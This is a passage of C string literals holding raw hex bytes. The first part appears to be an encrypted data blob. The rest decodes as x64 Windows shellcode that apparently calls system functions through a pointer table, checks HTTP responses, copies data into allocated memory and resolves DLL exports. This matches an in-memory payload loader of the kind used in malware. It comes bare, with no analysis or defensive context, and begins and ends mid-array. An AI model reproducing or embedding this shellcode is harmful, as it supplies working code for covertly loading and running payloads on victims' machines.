"\x3d\x8b\x8e\x02\xb5\x36\xd8\x41\x9d\x45\x82\x16\x53\x9f\xfc\x15"
"\x2c\xa1\x5c\x3c\xe9\x33\x8d\x1c\x62\x44\xcb\xe8\x61\xbe\x9f\xc0"
"\x2e\x2b\x41\x01\xb5\xcc\xc3\x15\x2d\x9f\x40\xd3\x56\x2d\x9d\x7c"
"\x08\x3c\x4b\xfd\x20\xfb\x07\xe2\x73\xec\x9a\x4c\xc5\x6c\x38\x27"
"\xa6\x38\xa0\x3d\x00\x49\x90\xa6\x85\x41\x9a\x07\x39\x1e\x56\x9c"
"\x48\xc5\xd6\x17\x30\xa3\x56\xf5\x98\xeb\xf1\x81\x66\xe0\x8a\x8e"
"\xa8\xa7\xfa\xb4\x1f\xc9\x8b\xa4\x2f\x1b\xdd\xfb\x02\x39\xe7\xb2"
"\x0c\x09\x4c\xa7\x67\x1c\x83\x47\x00\x69\x52\x89\x33\x81\xb5\xd5"
"\x80\x1e\x15\xf7\x18\xae\x75\xf5\x4d\x2f\x73\xdd\xf1\x03\xbd\xb8"
"\x4f\xab\x8e\xb4\xd5\x73\x74\x67\x11\x0a\x22\x2c\x86\x0e\x0f\xee"
"\x7b\x06\x02\xa4\x74\x45\x7a\x0a\xcd\xf9\xa3\xd8\xfa\x42\x0b\xa7"
"\x69\xa6\x82\x0a\x99\x0c\xe3\xf5\x40\x5c\xbc\x61\x9f\x38\x18\x29"
"\x39\x71\xb1\x62\xf6\xbf\xb6\x40\x73\x07\xeb\xcf\xd3\xd8\x33\x31"
"\x98\x22\x7f\xef\xdb\xc1\x57\x08\x31\x2f\xe6\xc8\x23\x9c\xc9\x82"
"\x4e\xbe\x71\xb3\x40\x04\xe5\xb7\xf1\x21\x4d\x30\x40\x1d\x99\x83"
"\x0f\x66\xf9\x04\xa1\x0c\xb4\xa5\x8f\xb5\x66\x16\x2b\xda\xaa\xfd"
"\x58\x61\xb7\x19\x2b\x9d\xae\xc5\xea\xfd\x56\x0f\x1b\xf3\x68\xf1"
"\x75\x62\x9a\x40\x64\xac\x79\x07\xe7\xb4\x24\x14\x38\x0a\xa2\xfd"
"\xfc\x59\x86\xea\x20\x2f\xe7\xe7\xa2\xfb\xa8\xe2\x61\x90\x1b\xaf"
"\x67\x48\x7e\x11\xf2\x7b\xa2\x54\x4e\x98\x15\x12\xcd\x80\xa5\xc0"
"\xf9\x14\x8b\x9a\x47\x11\x5f\xaa\xbb\x34\x7c\xcb\xe7\xa5\x7c\xd2"
"\x8a\xb5\x31\x9b\xbf\x51\xea\x72\xa1\xf9\x03\x06\xc9\x49\xe5\xc0"
"\x95\x1d\xae\x64\x5a\x0e\xb4\x5f\x00\x7e\x0c\x90\xd3\x67\xe2\x56"
"\x5a\x66\x61\x1d\x36\x2c\xd7\x23\x81\x0d\x41\x55\xd5\x67\x1e\x49"
"\x3f\x94\x40\xc7\x46\x57\x25\xd5\xc1\x5e\xb7\x88\x74\x99\xaf\x74"
"\x2f\xe4\x80\x34\x89\xfd\xae\x5b\xf5\xa3\xe8\x9b\x8c\x34\x43\xa0"
"\x74\xb7\x02\x2a\xac\x24\x02\xc4\x02\xc9\x61\x17\x6b\xbb\xc2\xe2"
"\x95\xa9\x07\x77\x1b\x6c\xca\xd9\x8e\x66\xfc\x02\x59\x6b\x6f\xc7"
"\x8b\x1e\x31\x14\x17\xbe\x2f\xbf\x0c\xc3\x01\x31\xf3\x78\xfe\xbf"
"\x0e\xe3\xe7\x2f\xfa\xcf\x0b\x74\x07\xba\x9e\x75\xd7\xa0\x15\x96"
"\x4b\xf8\xc2\x3b\xca\x9e\xe6\xd5\x88\x37\xf1\xe9\xf3\x5c\xc8\xfc"
"\x2a\xd7\xb5\xc8\x11\x4d\x54\x67\x8e\x55\x7d\x92\x88\x83\xbd\xd5"
"\x7a\xd7\x2d\x12\x0a\x63\xa3\x41\xeb\x08\x94\x21\x7a\x98\x24\x2d"
"\xd6\xa6\x32\x8f\x04\xe1\xf7\x38\x69\xdc\xdf\xec\x09\x21\x63\xa9"
"\xce\xfe\xfe\xa7\xc2\x90\xc1\x42\xa4\xef\x82\x1e\x90\x20\x34\x42"
"\xa2\x16\xd6\x17\x29\xdf\x8f\xbd\x0a\xe4\xdb\x16\x62\xc9\xd3\x3c"
"\xc6\x51\x21\x4f\x2e\x74\x97\xec\xf5\xd9\x37\xe7\xe9\x51\x15\x9b"
"\xc2\xf3\x77\xc2\xe9\x5c\x53\xe1\x30\xce\xa7\xca\x92\x5a\xf3\xcf"
"\x88\xb3\x4e\x42\x0b\x49\xf2\xca\xbe\xb5\x58\xd3\xb4\x0c\xd0\x40"
"\x04\x93\x70\x19\x7b\x1f\x23\x5c\x17\xc1\x78\x78\x94\x28\x58\x8e"
"\x05\x59\xb3\x54\x41\xea\xac\xf3\xe7\xec\xe8\x96\x15\x7d\x67\xda"
"\xb8\x8c\xd7\x20\x9e\xf5\xaa\xa4\x6a\x3a\x5b\xbb\x81\xa3\x29\x9e"
"\xf9\xa7\x06\xad\xf3\xa3\x36\x3f\x5d\xb1\xe3\x56\xb1\xcf\xd5\x36"
"\xea\x4b\xea\x48\xfd\xf4\xf1\x92\x68\xfb\x57\xe2\xdd\x05\xed\x3a"
"\x5a\xc7\x04\xc0\x0d\x94\x8c\xb8\x4d\xf5\xf3\x2c\x40\x26\x38\x45"
"\x2c\x3d\x1a\x30\xbf\xa7\x13\x18\x8b\xbe\xfc\xdc\xcc\x39\x74\x17"
"\xea\x6d\x46\x61\x22\x96\x9d\xc2\x79\x4b\xac\x1c\xeb\x8f\x0e\xea"
"\x6b\x62\x05\x69\x94\x11\x0a\xf1\xfb\x64\x2b\x6f\xd6\x03\xd8\x76"
"\x9d\xf7\x25\xbb\xda\x48\x53\x38\x63\x95\xab\xf4\x1f\xd4\x56\xfc"
"\xfa\xec\x7a\xe4\x69\x80\x06\xd4\x5e\x94\x3f\x2b\xf1\x3f\x12\x76"
"\xc2\xb9\x9e\x60\x34\x71\xbc\x37\x8a\xf2\x46\x0f\x10\x31\x64\x23"
"\x5a\x77\x95\xc4\x12\x34\x37\xda\x31\xe0\xb4\x87\x34\xdd\x23\xdd"
"\x0a\xae\x47\x35\x5d\x50\x13\x9f\x7d\x8f\x52\x2d\x87\xf2\xfe\xe0"
"\x12\x76\x9b\xda\x9b\x74\x68\x2a\x4c\xb1\x7a\x26\x07\xe4\xd7\xd4"
"\xe8\x02\x85\x19\xc8\xdf\x9b\xc4\x1f\x4a\xa0\xb6\x68\xa0\x4b\x05"
"\x69\x65\x69\xf4\x1b\x64\x14\x57\x16\x47\x14\x62\x5a\x18\x7f\xf2"
"\xee\x70\x57\x58\x3b\x7a\x30\x0c\xce\xc0\x0b\xc1\x2f\xac\x76\xef"
"\xa4\xa7\xc1\x18\xcb\x7b\x29\x1b\x01\xbf\xbf\xb4\x8d\x6a\x5b\x66"
"\x8f\x28\xc0\xfd\x8d\x0a\xe9\x80\x55\x2f\xa6\xf5\xef\x59\x12\xb4"
"\xdb\x1f\x5e\x65\x20\x67\xc7\x5a\x89\xa3\xfe\x39\x16\xef\xe5\xb8"
"\x71\x28\x0e\x4a\xc9\xc1\xfe\xe8\x68\xc0\x44\xf7\x44\xc3\xd3\x15"
"\x25\x18\x54\x17\x67\x18\x2c\xbd\x5f\xbe\xff\xf9\xc7\x60\x70\x32"
"\x96\x32\x1e\x44\x6e\x67\x5d\x80\x66\x5e\xe5\x4d\xd2\xdf\x0a\x1c"
"\xb2\x41\x2a\x37\x25\xfa\x1b\x0a\xe3\x25\xc3\xcf\x5f\x6e\x15\xd2"
"\x30\xc0\xfc\xb0\x53\x57\x89\x02\x13\x5a\x4c\xbc\x5e\x29\x99\xeb"
"\x14\x35\x7c\xa1\x73\x76\xb9\x89\x2e\x91\xb4\xf2\x1b\x18\xda\x03"
"\xf1\x73\xa4\x25\xb2\xdb\xe7\x14\xb6\x1f\x47\x43\x02\x4a\xc7\x01"
"\x4c\xdd\x41\x60\x0d\x7d\x0c\x82\x06\xda\x2b\x6a\x7f\xaa\xf0\x7a"
"\x85\x58\x93\xb3\x4d\xf8\x74\xe3\xc9\xbd\xa6\x0d\x03\xb3\x3b\x9b"
"\x58\x14\x28\x5c\xce\x37\x63\xe0\x43\x79\x35\x14\xe0\x5e\xc1\x1b"
"\xd0\xba\xdb\xb8\x05\x68\xa8\xc1\x0e\xa0\x55\x2f\xc2\x59\x8a\x38"
"\x66\x31\x99\x41\x0c\xb6\xe0\xf6\x17\x5c\x69\xe1\xd4\x66\xe9\xec"
"\x11\x4b\xbd\x69\xc0\x1d\xed\xd0\x5f\x46\xf8\x6f\x69\xc2\xfa\xcd"
"\x33\xb4\xb8\x68\x9d\x5f\xfc\xdc\x29\x40\x46\x53\xb6\x72\x40\xf8"
"\xb3\x3d\x0f\x01\x2f\x27\x78\xe8\x61\x47\x33\xfd\xe1\x74\xcb\x47"
"\xc1\x54\x4f\x5d\x46\xb4\xc4\x3d\x55\xa3\x8e\xda\x1b\x52\xa2\xbf"
"\x3b\x9c\x03\x6e\x37\xe3\x2b\xe9\xc6\xed\x67\x06\x92\x11\x06\x64"
"\x4a\x0d\xcd\xe4\xf6\x59\x31\xc0\x48\x0f\x88\xec\x34\x00\x00\x55"
"\x48\x89\xe5\x48\x83\xe4\xf0\x48\x83\xec\x20\xe8\x05\x00\x00\x00"
"\x48\x89\xec\x5d\xc3\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48"
"\x89\x74\x24\x18\x57\x41\x56\x41\x57\x48\x81\xec\x00\x05\x00\x00"
"\x33\xff\x48\x8b\xd9\x39\xb9\x38\x02\x00\x00\x0f\x84\xce\x00\x00"
"\x00\x4c\x8b\x41\x28\x48\x8b\x91\x88\x00\x00\x00\xe8\x34\x2e\x00"
"\x00\x48\x85\xc0\x0f\x84\xaf\x00\x00\x00\x48\x21\x7c\x24\x28\x4c"
"\x8d\x05\x8f\x13\x00\x00\x21\x7c\x24\x20\x4c\x8b\xcb\x33\xd2\x33"
"\xc9\xff\xd0\x4c\x8b\x43\x28\x48\x8b\xcb\x48\x8b\x93\x08\x02\x00"
"\x00\x48\x8b\xf8\xe8\xfc\x2d\x00\x00\x4c\x8b\x43\x28\x48\x8b\xcb"
"\x48\x8b\x93\xa0\x00\x00\x00\x4c\x8b\xf0\xe8\xe6\x2d\x00\x00\x4c"
"\x8b\x43\x28\x48\x8b\xcb\x48\x8b\x93\xa8\x00\x00\x00\x48\x8b\xf0"
"\xe8\xd0\x2d\x00\x00\x33\xc9\x48\x8b\xe8\xff\x53\x40\x4c\x8b\xf8"
"\x4d\x85\xf6\x74\x4f\x48\x85\xf6\x74\x4a\x48\x85\xed\x74\x45\xc7"
"\x44\x24\x60\x0b\x00\x10\x00\xff\xd5\x48\x8b\xc8\x48\x8d\x54\x24"
"\x30\xff\xd6\x8b\x83\x38\x02\x00\x00\x48\x8d\x4c\x24\x30\x48\x83"
"\xa4\x24\xc8\x00\x00\x00\xf0\x49\x03\xc7\x33\xd2\x48\x89\x84\x24"
"\x28\x01\x00\x00\x41\xff\xd6\xeb\x0b\x48\x83\xc8\xff\xeb\x08\xe8"
"\xe1\x12\x00\x00\x48\x8b\xc7\x4c\x8d\x9c\x24\x00\x05\x00\x00\x49"
"\x8b\x5b\x20\x49\x8b\x6b\x28\x49\x8b\x73\x30\x49\x8b\xe3\x41\x5f"
"\x41\x5e\x5f\xc3\xcc\xf0\xff\x41\x08\x8b\x41\x08\xc3\xb8\x01\x40"
"\x00\x80\xc3\xcc\xcc\x4d\x85\xc0\x75\x06\xb8\x03\x40\x00\x80\xc3"
"\x4c\x8b\x49\x10\x49\x8b\x81\x30\x08\x00\x00\x48\x3b\x02\x75\x0d"
"\x49\x8b\x81\x38\x08\x00\x00\x48\x3b\x42\x08\x74\x19\x49\x8b\x81"
"\xf0\x08\x00\x00\x48\x3b\x02\x75\x17\x49\x8b\x81\xf8\x08\x00\x00"
"\x48\x3b\x42\x08\x75\x0a\x49\x89\x08\xf0\xff\x41\x08\x33\xc0\xc3"
"\x49\x83\x20\x00\xb8\x02\x40\x00\x80\xc3\xcc\xcc\xcc\x83\xc8\xff"
"\xf0\x0f\xc1\x41\x08\xff\xc8\xc3\xcc\x33\xc0\xc3\xcc\x48\x89\x5c"
"\x24\x08\x48\x89\x6c\x24\x10\x48\x89\x74\x24\x18\x57\x48\x83\xec"
"\x20\x49\x8b\xf9\x41\x8b\xe8\x48\x8b\xf1\x41\xf6\xc0\x02\x74\x1b"
"\x48\x8b\x5c\x24\x50\x48\x85\xdb\x74\x1c\x48\x8b\x49\x38\x48\x8b"
"\x01\xff\x50\x08\x48\x8b\x46\x38\x48\x89\x03\x40\xf6\xc5\x01\x74"
"\x1c\x48\x85\xff\x75\x07\xb8\x03\x40\x00\x80\xeb\x12\x48\x8d\x5e"
"\x28\x48\x8b\x03\x48\x8b\xcb\xff\x50\x08\x48\x89\x1f\x33\xc0\x48"
"\x8b\x5c\x24\x30\x48\x8b\x6c\x24\x38\x48\x8b\x74\x24\x40\x48\x83"
"\xc4\x20\x5f\xc3\xcc\x40\x53\x48\x83\xec\x20\x48\x8b\x41\x58\x48"
"\x8b\xda\xff\x50\x78\x89\x03\x33\xc0\x48\x83\xc4\x20\x5b\xc3\xcc"
"\xcc\x48\x8b\xc4\x53\x48\x83\xec\x60\x83\x60\x20\x00\x48\x8d\x48"
"\xb8\x83\x60\x18\x00\x48\x8b\xda\x83\x60\x10\x00\x33\xd2\x44\x8d"
"\x42\x40\xe8\x1e\x32\x00\x00\x48\x8b\x03\x48\x8d\x54\x24\x20\x48"
"\x8b\xcb\xff\x50\x18\x85\xc0\x75\x1e\x48\x8b\x03\x4c\x8d\x4c\x24"
"\x78\x4c\x8d\x84\x24\x80\x00\x00\x00\x48\x8b\xcb\x48\x8d\x94\x24"
"\x88\x00\x00\x00\xff\x50\x20\x33\xc0\x48\x83\xc4\x60\x5b\xc3\xcc"
"\xcc\x4d\x8b\xc8\x4d\x85\xc0\x75\x06\xb8\x03\x40\x00\x80\xc3\x4c"
"\x8b\x41\x58\x49\x8b\x80\x30\x08\x00\x00\x48\x3b\x02\x75\x0d\x49"
"\x8b\x80\x38\x08\x00\x00\x48\x3b\x42\x08\x74\x19\x49\x8b\x80\xe0"
"\x08\x00\x00\x48\x3b\x02\x75\x16\x49\x8b\x80\xe8\x08\x00\x00\x48"
"\x3b\x42\x08\x75\x09\x49\x89\x09\xf0\xff\x41\x08\xeb\x24\x49\x8b"
"\x80\xf0\x08\x00\x00\x48\x3b\x02\x75\x1b\x49\x8b\x80\xf8\x08\x00"
"\x00\x48\x3b\x42\x08\x75\x0e\x48\x8d\x41\x10\x49\x89\x01\xf0\xff"
"\x41\x18\x33\xc0\xc3\x49\x83\x21\x00\xb8\x02\x40\x00\x80\xc3\xcc"
"\xcc\x48\x8b\x44\x24\x30\x83\x20\x00\x33\xc0\xc3\xcc\x0f\xaf\xca"
"\x8b\xc1\xc3\xcc\xcc\x48\x8b\x44\x24\x28\x83\x20\x00\x33\xc0\xc3"
"\xcc\x8d\x04\x11\xc3\x48\x89\x5c\x24\x18\x55\x56\x57\x41\x56\x41"
"\x57\x48\x83\xec\x20\x48\x8d\x91\x54\x03\x00\x00\x48\x8b\xd9\xe8"
"\x91\x28\x00\x00\x48\x8b\xf0\x48\x85\xc0\x75\x0a\xb8\x01\x00\x00"
"\x00\xe9\xe7\x00\x00\x00\x4c\x8d\x83\xc8\x05\x00\x00\x45\x33\xc9"
"\x48\x8b\xd6\x48\x8b\xcb\xe8\x52\x29\x00\x00\x48\x8b\xe8\x48\x85"
"\xc0\x0f\x84\xc4\x00\x00\x00\x48\x8d\x3d\x8f\xff\xff\xff\x4c\x8d"
"\x3d\x7c\xff\xff\xff\x41\x2b\xff\x0f\x88\xad\x00\x00\x00\x4c\x8d"
"\x4c\x24\x50\x8b\xd7\x41\xb8\x40\x00\x00\x00\x44\x8b\xf7\x48\x8b"
"\xc8\xff\x53\x60\x85\xc0\x0f\x84\x8f\x00\x00\x00\x44\x8b\xc7\x49"
"\x8b\xd7\x48\x8b\xcd\xe8\x8b\x30\x00\x00\x44\x8b\x44\x24\x50\x4c"
"\x8d\x4c\x24\x58\x41\x8b\xd6\x48\x8b\xcd\xff\x53\x60\x4c\x8d\x83"
"\xd8\x05\x00\x00\x45\x33\xc9\x48\x8b\xd6\x48\x8b\xcb\xe8\xdb\x28"
"\x00\x00\x48\x8b\xf0\x48\x85\xc0\x74\x51\x48\x8d\x3d\x30\xff\xff"
"\xff\x4c\x8d\x35\x1d\xff\xff\xff\x41\x2b\xfe\x78\x3e\x4c\x8d\x4c"
"\x24\x50\x8b\xd7\x41\xb8\x40\x00\x00\x00\x8b\xef\x48\x8b\xc8\xff"
"\x53\x60\x85\xc0\x74\x25\x44\x8b\xc7\x49\x8b\xd6\x48\x8b\xce\xe8"
"\x21\x30\x00\x00\x44\x8b\x44\x24\x50\x4c\x8d\x4c\x24\x58\x8b\xd5"
"\x48\x8b\xce\xff\x53\x60\xe9\x11\xff\xff\xff\x33\xc0\x48\x8b\x5c"
"\x24\x60\x48\x83\xc4\x20\x41\x5f\x41\x5e\x5f\x5e\x5d\xc3\xcc\xcc"
"\xcc\x48\x89\x5c\x24\x18\x48\x89\x74\x24\x20\x57\x48\x83\xec\x20"
"\x48\x8d\x91\x68\x03\x00\x00\x48\x8b\xd9\xe8\x66\x27\x00\x00\x4c"
"\x8d\x83\xe8\x05\x00\x00\x45\x33\xc9\x48\x8b\xd0\x48\x8b\xcb\xe8"
"\x39\x28\x00\x00\x48\x8b\xf8\x48\x85\xc0\x74\x42\xbe\x01\x00\x00"
"\x00\x4c\x8d\x4c\x24\x30\x8b\xd6\x48\x8b\xc8\x44\x8d\x46\x3f\xff"
"\x53\x60\x85\xc0\x74\x28\x48\x8d\x93\x0c\x06\x00\x00\x44\x8b\xc6"
"\x48\x8b\xcf\xe8\x8d\x2f\x00\x00\x44\x8b\x44\x24\x30\x4c\x8d\x4c"
"\x24\x38\x8b\xd6\x48\x8b\xcf\xff\x53\x60\x8b\xc6\xeb\x02\x33\xc0"
"\x48\x8b\x5c\x24\x40\x48\x8b\x74\x24\x48\x48\x83\xc4\x20\x5f\xc3"
"\xcc\x40\x55\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8d"
"\xac\x24\x88\xfd\xff\xff\x48\x81\xec\x78\x03\x00\x00\x45\x33\xff"
"\x48\x8b\xf9\x44\x21\xbd\xd8\x02\x00\x00\x48\x8d\x4c\x24\x60\x33"
"\xd2\x33\xf6\xbb\x00\x03\x60\x04\x45\x8d\x77\x68\x45\x8b\xc6\xe8"
"\x41\x2f\x00\x00\xb9\x04\x01\x00\x00\x44\x89\x74\x24\x60\x89\x4d"
"\x80\x48\x8d\x85\x60\x01\x00\x00\x48\x89\x44\x24\x78\x4c\x8d\x4c"
"\x24\x60\x89\x4d\xb0\x48\x8d\x45\x50\x48\x89\x45\xa8\x8d\x4e\x40"
"\x48\x8d\x45\xd0\x89\x4d\x90\x48\x89\x45\x88\x33\xd2\x48\x8d\x45"
"\x10\x89\x4d\xa0\x48\x8d\x8f\x24\x09\x00\x00\x48\x89\x45\x98\x41"
"\xb8\x00\x00\x00\x10\xff\x97\x48\x01\x00\x00\x45\x33\xf6\x85\xc0"
"\x0f\x84\xd5\x03\x00\x00\x83\x7c\x24\x74\x04\xb8\x00\x33\xe0\x04"
"\x45\x8b\xe6\x44\x89\x74\x24\x20\x41\x0f\x94\xc4\x0f\x44\xd8\x45"
"\x33\xc9\x45\x33\xc0\x33\xd2\x33\xc9\xff\x97\x50\x01\x00\x00\x48"
"\x89\x44\x24\x58\x48\x85\xc0\x0f\x84\x9e\x03\x00\x00\x44\x0f\xb7"
"\x45\x84\x48\x8d\x95\x60\x01\x00\x00\x4c\x89\x74\x24\x38\x45\x33"
"\xc9\x44\x89\x74\x24\x30\x48\x8b\xc8\xc7\x44\x24\x28\x03\x00\x00"
"\x00\x4c\x89\x74\x24\x20\xff\x97\x58\x01\x00\x00\x48\x89\x44\x24"
"\x48\x4c\x8b\xe8\x48\x85\xc0\x0f\x84\x03\x03\x00\x00\x44\x39\x75"
"\xb0\x75\x06\x66\xc7\x45\x50\x2f\x00\x4c\x89\x74\x24\x38\x4c\x8d"
"\x45\x50\x89\x5c\x24\x30\x45\x33\xc9\x4c\x89\x74\x24\x28\x33\xd2"
"\x48\x8b\xc8\x4c\x89\x74\x24\x20\xff\x97\x80\x01\x00\x00\x4c\x8b"
"\xf0\x48\x85\xc0\x0f\x84\xba\x02\x00\x00\x45\x85\xe4\x74\x26\x0f"
"\xba\xe3\x0c\x73\x20\x41\xb9\x04\x00\x00\x00\xc7\x44\x24\x50\x80"
"\x33\x00\x00\x4c\x8d\x44\x24\x50\x48\x8b\xc8\x41\x8d\x51\x1b\xff"
"\x97\x60\x01\x00\x00\x44\x8b\x4d\x90\x33\xdb\x45\x85\xc9\x74\x12"
"\x4c\x8b\x45\x88\x8d\x53\x1c\x49\x8b\xce\xff\x97\x60\x01\x00\x00"
"\x8b\xf0\x44\x8b\x4d\xa0\x45\x85\xc9\x74\x14\x4c\x8b\x45\x98\xba"
"\x1d\x00\x00\x00\x49\x8b\xce\xff\x97\x60\x01\x00\x00\x8b\xf0\x45"
"\x33\xc9\x89\x5c\x24\x20\x45\x33\xc0\x33\xd2\x49\x8b\xce\xff\x97"
"\x88\x01\x00\x00\x85\xc0\x0f\x84\x2f\x02\x00\x00\x4c\x8d\x8d\xd0"
"\x02\x00\x00\xc7\x85\xd0\x02\x00\x00\x04\x00\x00\x00\x4c\x8d\x85"
"\xd8\x02\x00\x00\x48\x89\x5c\x24\x20\xba\x13\x00\x00\x20\x49\x8b"
"\xce\xff\x97\x90\x01\x00\x00\x85\xc0\x0f\x84\xfc\x01\x00\x00\x81"
"\xbd\xd8\x02\x00\x00\xc8\x00\x00\x00\x0f\x85\xec\x01\x00\x00\x4c"
"\x8d\x8d\xd0\x02\x00\x00\xc7\x85\xd0\x02\x00\x00\x08\x00\x00\x00"
"\x4c\x8d\x85\xc0\x02\x00\x00\x89\x9d\xc0\x02\x00\x00\xba\x05\x00"
"\x00\x20\x48\x89\x5c\x24\x20\x49\x8b\xce\xff\x97\x90\x01\x00\x00"
"\x85\xc0\x0f\x85\xee\x00\x00\x00\xff\x97\xe8\x00\x00\x00\x3d\x76"
"\x2f\x00\x00\x0f\x85\xa2\x01\x00\x00\x45\x33\xc9\x89\x9d\xc0\x02"
"\x00\x00\x45\x33\xc0\x48\x8d\x95\xc8\x02\x00\x00\x49\x8b\xce\xff"
"\x97\x78\x01\x00\x00\x85\xc0\x0f\x84\x7e\x01\x00\x00\x41\xbc\x01"
"\x00\x00\x00\x8b\x8d\xc8\x02\x00\x00\x85\xc9\x0f\x84\x93\x00\x00"
"\x00\x48\x8b\x97\xd8\x00\x00\x00\x4d\x85\xff\x75\x15\x8b\xd9\xff"
"\xd2\x48\x8b\xc8\x44\x8b\xc3\x41\x8b\xd4\xff\x97\xc8\x00\x00\x00"
"\xeb\x1c\x8b\x9d\xc0\x02\x00\x00\x03\xd9\xff\xd2\x48\x8b\xc8\x44"
"\x8b\xcb\x4d\x8b\xc7\x41\x8b\xd4\xff\x97\xd0\x00\x00\x00\x33\xdb"
"\x4c\x8b\xf8\x48\x85\xc0\x0f\x84\x1f\x01\x00\x00\x8b\x95\xc0\x02"
"\x00\x00\x4c\x8d\x4c\x24\x40\x44\x8b\x85\xc8\x02\x00\x00\x48\x03"
"\xd0\x49\x8b\xce\xff\x97\x68\x01\x00\x00\x8b\x85\xc8\x02\x00\x00"
"\x48\x8d\x95\xc8\x02\x00\x00\x01\x85\xc0\x02\x00\x00\x45\x33\xc9"
"\x45\x33\xc0\x49\x8b\xce\xff\x97\x78\x01\x00\x00\x85\xc0\x0f\x85"
"\x5f\xff\xff\xff\x4c\x8d\xaf\xd8\x00\x00\x00\x4d\x85\xff\x0f\x84"
"\xc2\x00\x00\x00\xeb\x5c\x8b\x85\xc0\x02\x00\x00\x85\xc0\x0f\x84"
"\xb7\x00\x00\x00\x4c\x8d\xaf\xd8\x00\x00\x00\x8b\xd8\x41\xff\x55"
"\x00\x41\xbc\x01\x00\x00\x00\x44\x8b\xc3\x48\x8b\xc8\x41\x8b\xd4"
"\xff\x97\xc8\x00\x00\x00\x33\xdb\x4c\x8b\xf8\x48\x85\xc0\x0f\x84"
"\x82\x00\x00\x00\x44\x8b\x85\xc0\x02\x00\x00\x4c\x8d\x4c\x24\x40"
"\x48\x8b\xd0\x89\x5c\x24\x40\x49\x8b\xce\xff\x97\x68\x01\x00\x00"
"\x8b\xf0\x8b\x85\xc0\x02\x00\x00\x85\xc0\x74\x5a\x33\xc9\x8b\xd0"
"\x41\xb8\x00\x30\x00\x00\x44\x8d\x49\x04\xff\x57\x48\x48\x89\x87"
"\x60\x0d\x00\x00\x48\x85\xc0\x74\x17\x44\x8b\x85\xc0\x02\x00\x00"
"\x49\x8b\xd7\x48\x8b\xc8\xe8\x8a\x2b\x00\x00\x41\x8b\xf4\xeb\x02"
"\x8b\xf3\x44\x8b\x85\xc0\x02\x00\x00\x33\xd2\x49\x8b\xcf\xe8\x92"
"\x2b\x00\x00\x41\xff\x55\x00\x4d\x8b\xc7\x41\x8b\xd4\x48\x8b\xc8"
"\xff\x97\xe0\x00\x00\x00\x4c\x8b\x6c\x24\x48\x49\x8b\xce\xff\x97"
"\x70\x01\x00\x00\x49\x8b\xcd\xff\x97\x70\x01\x00\x00\x45\x33\xf6"
"\x48\x8b\x4c\x24\x58\xff\x97\x70\x01\x00\x00\x85\xf6\x74\x48\x83"
"\xbf\x34\x02\x00\x00\x03\x75\x3f\x48\x8b\x9f\x60\x0d\x00\x00\x48"
"\x8d\x97\x48\x0d\x00\x00\x44\x8b\x8f\x58\x0d\x00\x00\x48\x8d\x8f"
"\x38\x0d\x00\x00\x4c\x8b\xc3\xe8\x29\x27\x00\x00\x48\x8b\x57\x28"
"\x48\x8d\x8f\x2c\x0c\x00\x00\xe8\x8d\x25\x00\x00\x48\x3b\x83\x18"
"\x05\x00\x00\x41\x0f\x45\xf6\x8b\xc6\xeb\x02\x33\xc0\x48\x81\xc4"
"\x78\x03\x00\x00\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5b\x5d"
"\xc3\x48\x8b\xc4\x48\x89\x58\x20\x4c\x89\x40\x18\x48\x89\x48\x08"
"\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8d\xa8\xc8\xfe"
"\xff\xff\x48\x81\xec\x00\x02\x00\x00\x4c\x63\x72\x3c\x4d\x8b\xe1"
"\x48\x8b\xda\x41\x8b\x84\x16\x88\x00\x00\x00\x85\xc0\x0f\x84\x97"
"\x00\x00\x00\x48\x8d\x3c\x02\x8b\x77\x18\x85\xf6\x0f\x84\x88\x00"
"\x00\x00\x8b\x47\x1c\x33\xc9\x44\x8b\x47\x0c\x48\x03\xc2\x48\x89"
"\x44\x24\x28\x4c\x03\xc2\x8b\x47\x20\x48\x03\xc2\x48\x89\x85\x48"
"\x01\x00\x00\x8b\x47\x24\x48\x03\xc2\x48\x89\x44\x24\x20\x41\x8a"
"\x00\x84\xc0\x74\x14\x33\xd2\xff\xc1\x0c\x20\x88\x44\x15\xf0\x8b"
"\xd1\x42\x8a\x04\x01\x84\xc0\x75\xee\xc6\x44\x0d\xf0\x00\x49\x8b"
"\xd4\x48\x8d\x4d\xf0\xe8\xbf\x24\x00\x00\x4c\x8b\xe8\x48\x8b\x85"
"\x48\x01\x00\x00\x8d\x4e\xff\x8b\xf1\x44\x8b\xf9\x49\x8b\xd4\x8b"
"\x0c\x88\x48\x03\xcb\xe8\x9f\x24\x00\x00\x49\x33\xc5\x48\x3b\x85"
"\x50\x01\x00\x00\x74\x21\x85\xf6\x75\xd3\x33\xc0\x48\x8b\x9c\x24"
"\x58\x02\x00\x00\x48\x81\xc4\x00\x02\x00\x00\x41\x5f\x41\x5e\x41"
"\x5d\x41\x5c\x5f\x5e\x5d\xc3\x48\x8b\x44\x24\x20\x48\x8b\x4c\x24"
"\x28\x42\x0f\xb7\x04\x78\x44\x8b\x04\x81\x4c\x03\xc3\x4c\x3b\xc7"
"\x0f\x82\xaa\x00\x00\x00\x41\x8b\x84\x1e\x8c\x00\x00\x00\x48\x03"
"\xc7\x4c\x3b\xc0\x0f\x83\x96\x00\x00\x00\x45\x33\xd2\x45\x8b\xca"
"\x45\x38\x10\x74\x1f\x41\x83\xf9\x3c\x73\x19\x41\x8b\xc1\x42\x8a"
"\x0c\x00\x88\x4c\x04\x30\x80\xf9\x2e\x74\x09\x41\xff\xc1\x47\x38"
"\x14\x01\x75\xe1\x41\x8d\x41\x01\x8b\xd0\xc6\x44\x04\x30\x64\x41"
"\x8d\x41\x02\xc6\x44\x04\x30\x6c\x41\x8d\x41\x03\xc6\x44\x04\x30"
"\x6c\x41\x8d\x41\x04\x4e\x8d\x0c\x02\x44\x88\x54\x04\x30\x41\x8b"
"\xd2\x45\x38\x11\x74\x17\x83\xfa\x7f\x73\x12\x8b\xca\xff\xc2\x42"
"\x8a\x04\x09\x88\x44\x0c\x70\x46\x38\x14\x0a\x75\xe9\x48\x8b\x8d"
"\x40\x01\x00\x00\x4c\x8d\x4c\x24\x70\x8b\xc2\x4c\x8d\x44\x24\x30"
"\x48\x8b\xd3\x44\x88\x54\x04\x70\xe8\x0c\x00\x00\x00\x4c\x8b\xc0"
"\x49\x8b\xc0\xe9\x14\xff\xff\xff\xcc\x48\x8b\xc4\x48\x89\x58\x08"
